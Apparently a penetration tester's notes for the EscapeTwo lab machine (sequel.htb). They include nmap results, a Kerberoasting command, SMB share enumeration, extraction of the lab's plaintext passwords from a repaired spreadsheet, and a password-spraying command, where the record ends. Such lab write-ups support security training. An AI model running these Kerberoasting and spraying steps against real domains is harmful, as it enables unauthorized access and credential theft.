## IP/Name
### Initial access
Port scan
```
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2026-09-22 16:55:53Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: sequel.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.sequel.htb, DNS:sequel.htb, DNS:SEQUEL
| Issuer: commonName=sequel-DC01-CA/domainComponent=sequel
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-06-26T11:46:45
| Not valid after:  2124-06-08T17:00:40
| MD5:     b55a a63f 50ba ed44 f865 820a 5b8e f493
| SHA-1:   a87b 9555 5164 74d3 f73f bded 72e7 baab db76 c12a
| SHA-256: cf83 b653 43df 3ffb 1a19 69c8 300f daec 9b9c 3b17 66b1 3f48 a14d c0ac 4e7c 0cdb
| -----BEGIN CERTIFICATE-----
| MIIF6TCCBNGgAwIBAgITVAAAAAVjf8S2XKAtZAAAAAAABTANBgkqhkiG9w0BAQsF
| ADBGMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGc2VxdWVs
| MRcwFQYDVQQDEw5zZXF1ZWwtREMwMS1DQTAgFw0yNTA2MjYxMTQ2NDVaGA8yMTI0
| MDYwODE3MDA0MFowADCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAN6t
| PbrDaBr7iaqtpFrlC5txEmOlllkSRMtLsld7ZgwcBdmU4UU31oiAciONnCqnuXEg
| EsrgGO3Nufzbu66sgkMqtTd0MyiYb5+wVTqL5FxRXJCyyLnmjdoKdemZ9uqpwVRw
| RXR502G1YGNVtPFffxbU9vvcIe1SaIUvL9QXVkzJuze8a7mlQ964CPER4T9v3Q96
| 3RK8DHm64/EqR1hPMKAuIfHftAX5a67ARnVwBiXn3dItESQJoLliq+hsoXvcDxfA
| iBP0uOgLrKyZrKMNFOsPpFe4GwGxrNmVeigHRF9/IPzXmDJZC1C+ieIBL3J1tzOD
| 0RrwhK5LRVOijIkBsnECAwEAAaOCAxIwggMOMDcGCSsGAQQBgjcVBwQqMCgGICsG
| AQQBgjcVCIOFgESHvJM3hdGJJcLeUoTxqjiBKQEhAgFuAgECMDIGA1UdJQQrMCkG
| CCsGAQUFBwMCBggrBgEFBQcDAQYKKwYBBAGCNxQCAgYHKwYBBQIDBTAOBgNVHQ8B
| Af8EBAMCBaAwQAYJKwYBBAGCNxUKBDMwMTAKBggrBgEFBQcDAjAKBggrBgEFBQcD
| ATAMBgorBgEEAYI3FAICMAkGBysGAQUCAwUwHQYDVR0OBBYEFD3FI2lBcJiy3qh6
| t0wOZkt5ZV4EMB8GA1UdIwQYMBaAFMZBubbkDkfWBlps8YrGlP0a+7jDMIHIBgNV
| HR8EgcAwgb0wgbqggbeggbSGgbFsZGFwOi8vL0NOPXNlcXVlbC1EQzAxLUNBLENO
| PURDMDEsQ049Q0RQLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZp
| Y2VzLENOPUNvbmZpZ3VyYXRpb24sREM9c2VxdWVsLERDPWh0Yj9jZXJ0aWZpY2F0
| ZVJldm9jYXRpb25MaXN0P2Jhc2U/b2JqZWN0Q2xhc3M9Y1JMRGlzdHJpYnV0aW9u
| UG9pbnQwgb8GCCsGAQUFBwEBBIGyMIGvMIGsBggrBgEFBQcwAoaBn2xkYXA6Ly8v
| Q049c2VxdWVsLURDMDEtQ0EsQ049QUlBLENOPVB1YmxpYyUyMEtleSUyMFNlcnZp
| Y2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9c2VxdWVsLERDPWh0
| Yj9jQUNlcnRpZmljYXRlP2Jhc2U/b2JqZWN0Q2xhc3M9Y2VydGlmaWNhdGlvbkF1
| dGhvcml0eTAxBgNVHREBAf8EJzAlgg9EQzAxLnNlcXVlbC5odGKCCnNlcXVlbC5o
| dGKCBlNFUVVFTDBNBgkrBgEEAYI3GQIEQDA+oDwGCisGAQQBgjcZAgGgLgQsUy0x
| LTUtMjEtNTQ4NjcwMzk3LTk3MjY4NzQ4NC0zNDk2MzM1MzcwLTEwMDAwDQYJKoZI
| hvcNAQELBQADggEBAILdYpMzCMJ2jrzMqFcZs5zRq1lDJA7Q1W9cZXZpZktTkXdA
| cEkRlcLQN9ZxvydKHdR053nIGNXcVn7CHpK8OU6sleyY0RRm/hktREv53L3tt0i7
| Dks9d14cTKN5+r1aQmeCJo7bRdeeiQcMKDyyKndI4Tn03XWjYS0yOem+2PrrANgs
| 2YWLg6LrslYnHB0xMFup6da7ueNpuRxwekBen20P6v6R3STGascvNVqBNBpNTMRo
| CpokbunsA+8Bqqt3IWX5/Og2wCBL2v/dPiyjSQ3WYOwguyjDF8gQdVMIsW25vUMc
| 3UVUm1yCwc7rr5IEQAkXdTHzbNIHACbCvOotXZM=
|_-----END CERTIFICATE-----
|_ssl-date: 2026-09-22T16:57:31+00:00; -1m31s from scanner time.
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: sequel.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-09-22T16:57:31+00:00; -1m30s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.sequel.htb, DNS:sequel.htb, DNS:SEQUEL
| Issuer: commonName=sequel-DC01-CA/domainComponent=sequel
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-06-26T11:46:45
| Not valid after:  2124-06-08T17:00:40
| MD5:     b55a a63f 50ba ed44 f865 820a 5b8e f493
| SHA-1:   a87b 9555 5164 74d3 f73f bded 72e7 baab db76 c12a
| SHA-256: cf83 b653 43df 3ffb 1a19 69c8 300f daec 9b9c 3b17 66b1 3f48 a14d c0ac 4e7c 0cdb
| -----BEGIN CERTIFICATE-----
| MIIF6TCCBNGgAwIBAgITVAAAAAVjf8S2XKAtZAAAAAAABTANBgkqhkiG9w0BAQsF
| ADBGMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGc2VxdWVs
| MRcwFQYDVQQDEw5zZXF1ZWwtREMwMS1DQTAgFw0yNTA2MjYxMTQ2NDVaGA8yMTI0
| MDYwODE3MDA0MFowADCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAN6t
| PbrDaBr7iaqtpFrlC5txEmOlllkSRMtLsld7ZgwcBdmU4UU31oiAciONnCqnuXEg
| EsrgGO3Nufzbu66sgkMqtTd0MyiYb5+wVTqL5FxRXJCyyLnmjdoKdemZ9uqpwVRw
| RXR502G1YGNVtPFffxbU9vvcIe1SaIUvL9QXVkzJuze8a7mlQ964CPER4T9v3Q96
| 3RK8DHm64/EqR1hPMKAuIfHftAX5a67ARnVwBiXn3dItESQJoLliq+hsoXvcDxfA
| iBP0uOgLrKyZrKMNFOsPpFe4GwGxrNmVeigHRF9/IPzXmDJZC1C+ieIBL3J1tzOD
| 0RrwhK5LRVOijIkBsnECAwEAAaOCAxIwggMOMDcGCSsGAQQBgjcVBwQqMCgGICsG
| AQQBgjcVCIOFgESHvJM3hdGJJcLeUoTxqjiBKQEhAgFuAgECMDIGA1UdJQQrMCkG
| CCsGAQUFBwMCBggrBgEFBQcDAQYKKwYBBAGCNxQCAgYHKwYBBQIDBTAOBgNVHQ8B
| Af8EBAMCBaAwQAYJKwYBBAGCNxUKBDMwMTAKBggrBgEFBQcDAjAKBggrBgEFBQcD
| ATAMBgorBgEEAYI3FAICMAkGBysGAQUCAwUwHQYDVR0OBBYEFD3FI2lBcJiy3qh6
| t0wOZkt5ZV4EMB8GA1UdIwQYMBaAFMZBubbkDkfWBlps8YrGlP0a+7jDMIHIBgNV
| HR8EgcAwgb0wgbqggbeggbSGgbFsZGFwOi8vL0NOPXNlcXVlbC1EQzAxLUNBLENO
| PURDMDEsQ049Q0RQLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZp
| Y2VzLENOPUNvbmZpZ3VyYXRpb24sREM9c2VxdWVsLERDPWh0Yj9jZXJ0aWZpY2F0
| ZVJldm9jYXRpb25MaXN0P2Jhc2U/b2JqZWN0Q2xhc3M9Y1JMRGlzdHJpYnV0aW9u
| UG9pbnQwgb8GCCsGAQUFBwEBBIGyMIGvMIGsBggrBgEFBQcwAoaBn2xkYXA6Ly8v
| Q049c2VxdWVsLURDMDEtQ0EsQ049QUlBLENOPVB1YmxpYyUyMEtleSUyMFNlcnZp
| Y2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9c2VxdWVsLERDPWh0
| Yj9jQUNlcnRpZmljYXRlP2Jhc2U/b2JqZWN0Q2xhc3M9Y2VydGlmaWNhdGlvbkF1
| dGhvcml0eTAxBgNVHREBAf8EJzAlgg9EQzAxLnNlcXVlbC5odGKCCnNlcXVlbC5o
| dGKCBlNFUVVFTDBNBgkrBgEEAYI3GQIEQDA+oDwGCisGAQQBgjcZAgGgLgQsUy0x
| LTUtMjEtNTQ4NjcwMzk3LTk3MjY4NzQ4NC0zNDk2MzM1MzcwLTEwMDAwDQYJKoZI
| hvcNAQELBQADggEBAILdYpMzCMJ2jrzMqFcZs5zRq1lDJA7Q1W9cZXZpZktTkXdA
| cEkRlcLQN9ZxvydKHdR053nIGNXcVn7CHpK8OU6sleyY0RRm/hktREv53L3tt0i7
| Dks9d14cTKN5+r1aQmeCJo7bRdeeiQcMKDyyKndI4Tn03XWjYS0yOem+2PrrANgs
| 2YWLg6LrslYnHB0xMFup6da7ueNpuRxwekBen20P6v6R3STGascvNVqBNBpNTMRo
| CpokbunsA+8Bqqt3IWX5/Og2wCBL2v/dPiyjSQ3WYOwguyjDF8gQdVMIsW25vUMc
| 3UVUm1yCwc7rr5IEQAkXdTHzbNIHACbCvOotXZM=
|_-----END CERTIFICATE-----
1433/tcp  open  ms-sql-s      syn-ack ttl 127 Microsoft SQL Server 2019 15.00.2000.00; RTM
|_ssl-date: 2026-09-22T16:57:31+00:00; -1m31s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Issuer: commonName=SSL_Self_Signed_Fallback
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-09-22T16:48:22
| Not valid after:  2056-09-22T16:48:22
| MD5:     5024 74fb 206f 0b7f b700 e6f2 dedc 0b66
| SHA-1:   a75f ae0d 5b5e 3510 5856 a7f0 20a3 16b1 42d7 ae6a
| SHA-256: 452c 58e8 dbb2 d9f8 31f4 42f4 dd1c dc8a 0a6d e05e 8e0e 8b6d a380 ba1a c118 e564
| -----BEGIN CERTIFICATE-----
| MIIDADCCAeigAwIBAgIQUgw0vCPONbRJK6LGNXOOqzANBgkqhkiG9w0BAQsFADA7
| MTkwNwYDVQQDHjAAUwBTAEwAXwBTAGUAbABmAF8AUwBpAGcAbgBlAGQAXwBGAGEA
| bABsAGIAYQBjAGswIBcNMjYwOTIyMTY0ODIyWhgPMjA1NjA5MjIxNjQ4MjJaMDsx
| OTA3BgNVBAMeMABTAFMATABfAFMAZQBsAGYAXwBTAGkAZwBuAGUAZABfAEYAYQBs
| AGwAYgBhAGMAazCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBALff66aL
| S+ljG1s86AIoiP9bUV+ySqqvTVPv1VzvoQgvPxjTzYQl7SPeUOh8Jjy4IpJTw/kl
| 9yRXkiYOs8qlMP2/salhWHKSH/j1zZOfqTS7u1/e5mclM6A8cYtij168E47mpZj7
| v4W1mShjMG1Njwwuw5MdprNzYSD6MA4JOhKgJ+nO9T8vxaR3SMXHqunne9NrDzn4
| YRtRbcBpmisCwEBJ04Lt+VT6X1ppbSH8SalzmYNbCxlgGGz1TyQO99SIHbcCwxn/
| m2/1vi6FwXtlU/bsu03GvbstWJWyvwqY+NC/ITuualb6lDpOQ7vHp8RYnfjE86Wm
| jSj1MOzxnrd3MPUCAwEAATANBgkqhkiG9w0BAQsFAAOCAQEARbCGpHd6XjG2rtQ+
| Ej/OdJGTn7rYEN6hP9PtAFVPS1Ek4SQdPJA0tu7l7TdlW+n7AD0dN8lBkqr0F6y3
| nOcPxIHIue/QBl5hx+hBpSUN4b5G+orfdItoMqV/wHofxMkCRvU1jneDKIWZGed/
| MiFbZdaEZuAZeEG+pkE1KPiby7S3ep48v9QmqC+6OCcTXYYxSmBAWuKxcan31POv
| u9MXWAJPpymtPJGPmSPY8MmmaQzH8E75riKENo+UUzJ96FnDQ6UHSDSMZyUexTto
| NNnDjuWJVxj72SbRkx63BXkUbo5Nk/LM08PIsP/Ihgc+GRT0RO58GDwtU9a7IA/k
| E54HbA==
|_-----END CERTIFICATE-----
| ms-sql-ntlm-info: 
|   10.129.232.128:1433: 
|     Target_Name: SEQUEL
|     NetBIOS_Domain_Name: SEQUEL
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: sequel.htb
|     DNS_Computer_Name: DC01.sequel.htb
|     DNS_Tree_Name: sequel.htb
|_    Product_Version: 10.0.17763
| ms-sql-info: 
|   10.129.232.128:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: sequel.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-09-22T16:57:31+00:00; -1m31s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.sequel.htb, DNS:sequel.htb, DNS:SEQUEL
| Issuer: commonName=sequel-DC01-CA/domainComponent=sequel
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-06-26T11:46:45
| Not valid after:  2124-06-08T17:00:40
| MD5:     b55a a63f 50ba ed44 f865 820a 5b8e f493
| SHA-1:   a87b 9555 5164 74d3 f73f bded 72e7 baab db76 c12a
| SHA-256: cf83 b653 43df 3ffb 1a19 69c8 300f daec 9b9c 3b17 66b1 3f48 a14d c0ac 4e7c 0cdb
| -----BEGIN CERTIFICATE-----
| MIIF6TCCBNGgAwIBAgITVAAAAAVjf8S2XKAtZAAAAAAABTANBgkqhkiG9w0BAQsF
| ADBGMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGc2VxdWVs
| MRcwFQYDVQQDEw5zZXF1ZWwtREMwMS1DQTAgFw0yNTA2MjYxMTQ2NDVaGA8yMTI0
| MDYwODE3MDA0MFowADCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAN6t
| PbrDaBr7iaqtpFrlC5txEmOlllkSRMtLsld7ZgwcBdmU4UU31oiAciONnCqnuXEg
| EsrgGO3Nufzbu66sgkMqtTd0MyiYb5+wVTqL5FxRXJCyyLnmjdoKdemZ9uqpwVRw
| RXR502G1YGNVtPFffxbU9vvcIe1SaIUvL9QXVkzJuze8a7mlQ964CPER4T9v3Q96
| 3RK8DHm64/EqR1hPMKAuIfHftAX5a67ARnVwBiXn3dItESQJoLliq+hsoXvcDxfA
| iBP0uOgLrKyZrKMNFOsPpFe4GwGxrNmVeigHRF9/IPzXmDJZC1C+ieIBL3J1tzOD
| 0RrwhK5LRVOijIkBsnECAwEAAaOCAxIwggMOMDcGCSsGAQQBgjcVBwQqMCgGICsG
| AQQBgjcVCIOFgESHvJM3hdGJJcLeUoTxqjiBKQEhAgFuAgECMDIGA1UdJQQrMCkG
| CCsGAQUFBwMCBggrBgEFBQcDAQYKKwYBBAGCNxQCAgYHKwYBBQIDBTAOBgNVHQ8B
| Af8EBAMCBaAwQAYJKwYBBAGCNxUKBDMwMTAKBggrBgEFBQcDAjAKBggrBgEFBQcD
| ATAMBgorBgEEAYI3FAICMAkGBysGAQUCAwUwHQYDVR0OBBYEFD3FI2lBcJiy3qh6
| t0wOZkt5ZV4EMB8GA1UdIwQYMBaAFMZBubbkDkfWBlps8YrGlP0a+7jDMIHIBgNV
| HR8EgcAwgb0wgbqggbeggbSGgbFsZGFwOi8vL0NOPXNlcXVlbC1EQzAxLUNBLENO
| PURDMDEsQ049Q0RQLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZp
| Y2VzLENOPUNvbmZpZ3VyYXRpb24sREM9c2VxdWVsLERDPWh0Yj9jZXJ0aWZpY2F0
| ZVJldm9jYXRpb25MaXN0P2Jhc2U/b2JqZWN0Q2xhc3M9Y1JMRGlzdHJpYnV0aW9u
| UG9pbnQwgb8GCCsGAQUFBwEBBIGyMIGvMIGsBggrBgEFBQcwAoaBn2xkYXA6Ly8v
| Q049c2VxdWVsLURDMDEtQ0EsQ049QUlBLENOPVB1YmxpYyUyMEtleSUyMFNlcnZp
| Y2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9c2VxdWVsLERDPWh0
| Yj9jQUNlcnRpZmljYXRlP2Jhc2U/b2JqZWN0Q2xhc3M9Y2VydGlmaWNhdGlvbkF1
| dGhvcml0eTAxBgNVHREBAf8EJzAlgg9EQzAxLnNlcXVlbC5odGKCCnNlcXVlbC5o
| dGKCBlNFUVVFTDBNBgkrBgEEAYI3GQIEQDA+oDwGCisGAQQBgjcZAgGgLgQsUy0x
| LTUtMjEtNTQ4NjcwMzk3LTk3MjY4NzQ4NC0zNDk2MzM1MzcwLTEwMDAwDQYJKoZI
| hvcNAQELBQADggEBAILdYpMzCMJ2jrzMqFcZs5zRq1lDJA7Q1W9cZXZpZktTkXdA
| cEkRlcLQN9ZxvydKHdR053nIGNXcVn7CHpK8OU6sleyY0RRm/hktREv53L3tt0i7
| Dks9d14cTKN5+r1aQmeCJo7bRdeeiQcMKDyyKndI4Tn03XWjYS0yOem+2PrrANgs
| 2YWLg6LrslYnHB0xMFup6da7ueNpuRxwekBen20P6v6R3STGascvNVqBNBpNTMRo
| CpokbunsA+8Bqqt3IWX5/Og2wCBL2v/dPiyjSQ3WYOwguyjDF8gQdVMIsW25vUMc
| 3UVUm1yCwc7rr5IEQAkXdTHzbNIHACbCvOotXZM=
|_-----END CERTIFICATE-----
3269/tcp  open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: sequel.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-09-22T16:57:31+00:00; -1m30s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.sequel.htb, DNS:sequel.htb, DNS:SEQUEL
| Issuer: commonName=sequel-DC01-CA/domainComponent=sequel
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-06-26T11:46:45
| Not valid after:  2124-06-08T17:00:40
| MD5:     b55a a63f 50ba ed44 f865 820a 5b8e f493
| SHA-1:   a87b 9555 5164 74d3 f73f bded 72e7 baab db76 c12a
| SHA-256: cf83 b653 43df 3ffb 1a19 69c8 300f daec 9b9c 3b17 66b1 3f48 a14d c0ac 4e7c 0cdb
| -----BEGIN CERTIFICATE-----
| MIIF6TCCBNGgAwIBAgITVAAAAAVjf8S2XKAtZAAAAAAABTANBgkqhkiG9w0BAQsF
| ADBGMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGc2VxdWVs
| MRcwFQYDVQQDEw5zZXF1ZWwtREMwMS1DQTAgFw0yNTA2MjYxMTQ2NDVaGA8yMTI0
| MDYwODE3MDA0MFowADCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAN6t
| PbrDaBr7iaqtpFrlC5txEmOlllkSRMtLsld7ZgwcBdmU4UU31oiAciONnCqnuXEg
| EsrgGO3Nufzbu66sgkMqtTd0MyiYb5+wVTqL5FxRXJCyyLnmjdoKdemZ9uqpwVRw
| RXR502G1YGNVtPFffxbU9vvcIe1SaIUvL9QXVkzJuze8a7mlQ964CPER4T9v3Q96
| 3RK8DHm64/EqR1hPMKAuIfHftAX5a67ARnVwBiXn3dItESQJoLliq+hsoXvcDxfA
| iBP0uOgLrKyZrKMNFOsPpFe4GwGxrNmVeigHRF9/IPzXmDJZC1C+ieIBL3J1tzOD
| 0RrwhK5LRVOijIkBsnECAwEAAaOCAxIwggMOMDcGCSsGAQQBgjcVBwQqMCgGICsG
| AQQBgjcVCIOFgESHvJM3hdGJJcLeUoTxqjiBKQEhAgFuAgECMDIGA1UdJQQrMCkG
| CCsGAQUFBwMCBggrBgEFBQcDAQYKKwYBBAGCNxQCAgYHKwYBBQIDBTAOBgNVHQ8B
| Af8EBAMCBaAwQAYJKwYBBAGCNxUKBDMwMTAKBggrBgEFBQcDAjAKBggrBgEFBQcD
| ATAMBgorBgEEAYI3FAICMAkGBysGAQUCAwUwHQYDVR0OBBYEFD3FI2lBcJiy3qh6
| t0wOZkt5ZV4EMB8GA1UdIwQYMBaAFMZBubbkDkfWBlps8YrGlP0a+7jDMIHIBgNV
| HR8EgcAwgb0wgbqggbeggbSGgbFsZGFwOi8vL0NOPXNlcXVlbC1EQzAxLUNBLENO
| PURDMDEsQ049Q0RQLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZp
| Y2VzLENOPUNvbmZpZ3VyYXRpb24sREM9c2VxdWVsLERDPWh0Yj9jZXJ0aWZpY2F0
| ZVJldm9jYXRpb25MaXN0P2Jhc2U/b2JqZWN0Q2xhc3M9Y1JMRGlzdHJpYnV0aW9u
| UG9pbnQwgb8GCCsGAQUFBwEBBIGyMIGvMIGsBggrBgEFBQcwAoaBn2xkYXA6Ly8v
| Q049c2VxdWVsLURDMDEtQ0EsQ049QUlBLENOPVB1YmxpYyUyMEtleSUyMFNlcnZp
| Y2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9c2VxdWVsLERDPWh0
| Yj9jQUNlcnRpZmljYXRlP2Jhc2U/b2JqZWN0Q2xhc3M9Y2VydGlmaWNhdGlvbkF1
| dGhvcml0eTAxBgNVHREBAf8EJzAlgg9EQzAxLnNlcXVlbC5odGKCCnNlcXVlbC5o
| dGKCBlNFUVVFTDBNBgkrBgEEAYI3GQIEQDA+oDwGCisGAQQBgjcZAgGgLgQsUy0x
| LTUtMjEtNTQ4NjcwMzk3LTk3MjY4NzQ4NC0zNDk2MzM1MzcwLTEwMDAwDQYJKoZI
| hvcNAQELBQADggEBAILdYpMzCMJ2jrzMqFcZs5zRq1lDJA7Q1W9cZXZpZktTkXdA
| cEkRlcLQN9ZxvydKHdR053nIGNXcVn7CHpK8OU6sleyY0RRm/hktREv53L3tt0i7
| Dks9d14cTKN5+r1aQmeCJo7bRdeeiQcMKDyyKndI4Tn03XWjYS0yOem+2PrrANgs
| 2YWLg6LrslYnHB0xMFup6da7ueNpuRxwekBen20P6v6R3STGascvNVqBNBpNTMRo
| CpokbunsA+8Bqqt3IWX5/Og2wCBL2v/dPiyjSQ3WYOwguyjDF8gQdVMIsW25vUMc
| 3UVUm1yCwc7rr5IEQAkXdTHzbNIHACbCvOotXZM=
|_-----END CERTIFICATE-----
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
47001/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49689/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49690/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49692/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49708/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49724/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49733/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49802/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-09-22T16:56:54
|_  start_date: N/A
|_clock-skew: mean: -1m30s, deviation: 0s, median: -1m31s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 55945/tcp): CLEAN (Timeout)
|   Check 2 (port 57506/tcp): CLEAN (Timeout)
|   Check 3 (port 30386/udp): CLEAN (Timeout)
|   Check 4 (port 28573/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required

```
subdomain scan
dirscan
filescan

Kerberroating
```
┌──(kali㉿kali)-[~/HTB/EscapeTwo]
└─$ faketime "$(ntpdate -q 10.129.232.128 | cut -d ' ' -f 1,2)" impacket-GetUserSPNs sequel.htb/rose:'KxEPkKe6R8su' -dc-ip 10.129.232.128  -request -outputfile kerberos1.hash 

Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName     Name     MemberOf                                              PasswordLastSet             LastLogon                   Delegation 
-----------------------  -------  ----------------------------------------------------  --------------------------  --------------------------  ----------
sequel.htb/sql_svc.DC01  sql_svc  CN=SQLRUserGroupSQLEXPRESS,CN=Users,DC=sequel,DC=htb  2024-06-09 03:58:42.689521  2026-09-22 12:48:21.234970             
sequel.htb/ca_svc.DC01   ca_svc   CN=Cert Publishers,CN=Users,DC=sequel,DC=htb          2026-09-22 12:52:29.624875  2024-06-09 13:14:42.333365             



[-] CCache file is not found. Skipping...

```
SMB recon
```
SMB         10.129.232.128  445    DC01             Share           Permissions     Remark
SMB         10.129.232.128  445    DC01             -----           -----------     ------
SMB         10.129.232.128  445    DC01             Accounting Department READ            
SMB         10.129.232.128  445    DC01             ADMIN$                          Remote Admin
SMB         10.129.232.128  445    DC01             C$                              Default share
SMB         10.129.232.128  445    DC01             IPC$            READ            Remote IPC
SMB         10.129.232.128  445    DC01             NETLOGON        READ            Logon server share 
SMB         10.129.232.128  445    DC01             SYSVOL          READ            Logon server share 
SMB         10.129.232.128  445    DC01             Users           READ     
```
Impacket client
```
┌──(kali㉿kali)-[~/HTB/EscapeTwo]
└─$ impacket-smbclient 'rose:KxEPkKe6R8su'@10.129.232.128
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Type help for list of commands
# use Accounting Department
# ls
drw-rw-rw-          0  Sun Jun  9 07:11:31 2024 .
drw-rw-rw-          0  Sun Jun  9 07:11:31 2024 ..
-rw-rw-rw-      10217  Sun Jun  9 07:11:31 2024 accounting_2024.xlsx
-rw-rw-rw-       6780  Sun Jun  9 07:11:31 2024 accounts.xlsx
# mget *
[*] Downloading accounting_2024.xlsx
[*] Downloading accounts.xlsx
# 

```
We have corrupt file to restore it doing this
```
zip -F accounts.xlsx --out fixed_accounts.xlsx

unzip fixed_accounts.xlsx -d excel_data/

cat excel_data/xl/sharedStrings.xml

┌──(kali㉿kali)-[~/HTB/EscapeTwo/excel_data/xl]
└─$ cat sharedStrings.xml 
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" count="25" uniqueCount="24"><si><t xml:space="preserve">First Name</t></si><si><t xml:space="preserve">Last Name</t></si><si><t xml:space="preserve">Email</t></si><si><t xml:space="preserve">Username</t></si><si><t xml:space="preserve">Password</t></si><si><t xml:space="preserve">Angela</t></si><si><t xml:space="preserve">Martin</t></si><si><t xml:space="preserve">angela@sequel.htb</t></si><si><t xml:space="preserve">angela</t></si><si><t xml:space="preserve">0fwz7Q4mSpurIt99</t></si><si><t xml:space="preserve">Oscar</t></si><si><t xml:space="preserve">Martinez</t></si><si><t xml:space="preserve">oscar@sequel.htb</t></si><si><t xml:space="preserve">oscar</t></si><si><t xml:space="preserve">86LxLBMgEWaKUnBG</t></si><si><t xml:space="preserve">Kevin</t></si><si><t xml:space="preserve">Malone</t></si><si><t xml:space="preserve">kevin@sequel.htb</t></si><si><t xml:space="preserve">kevin</t></si><si><t xml:space="preserve">Md9Wlq1E5bZnVDVo</t></si><si><t xml:space="preserve">NULL</t></si><si><t xml:space="preserve">sa@sequel.htb</t></si><si><t xml:space="preserve">sa</t></si><si><t xml:space="preserve">MSSQLP@ssw0rd!</t></si></sst>  
```

We have list of pass word
```
MSSQLP@ssw0rd!
Md9Wlq1E5bZnVDVo
86LxLBMgEWaKUnBG
0fwz7Q4mSpurIt99
```

Spray password
```
┌──(kali㉿kali)-[~/HTB/EscapeTwo]
└─$ nxc ldap 10.129.232.128 -u users.txt s -p pass.txt --continue-on-success 
